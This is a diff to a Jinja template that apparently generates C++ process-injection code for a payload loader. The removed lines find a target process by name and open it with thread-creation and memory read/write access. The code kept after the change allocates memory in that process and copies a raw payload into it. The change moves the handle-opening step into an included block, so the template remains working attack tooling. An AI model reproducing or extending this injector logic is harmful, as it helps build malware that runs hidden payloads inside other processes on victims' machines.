@@ -1,25 +1,8 @@
 {% if section == "globals" %}
-    {% if link.alloc.functions.value in ["dynamic", "direct"] %}
-        {{ function_typedef("OpenProcess") }}
-        {{ function_typedef("CreateThread") }}
-    {% endif %}
-
+    {% include "blocks/get_process_handle.jinja" %}
     {% include "lib/sections.jinja" %}
-    {% include "lib/find_process.cpp" %}
 {% else %}
-    int pid = FindProcess("{{ link.target_process_name }}");
-    if(!pid){
-        printf("[-] Failed to discover process\n");
-        return 0;
-    }
-
-    {{ function_definition("OpenProcess") }}
-
-    HANDLE hProc = pOpenProcess(
-        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-        FALSE,
-        (DWORD) pid
-    );
+    {% include "blocks/get_process_handle.jinja" %}
 
     HANDLE hSelfProc = GetCurrentProcess();
     void *mem = alloc(hSelfProc, hProc, raw, length);
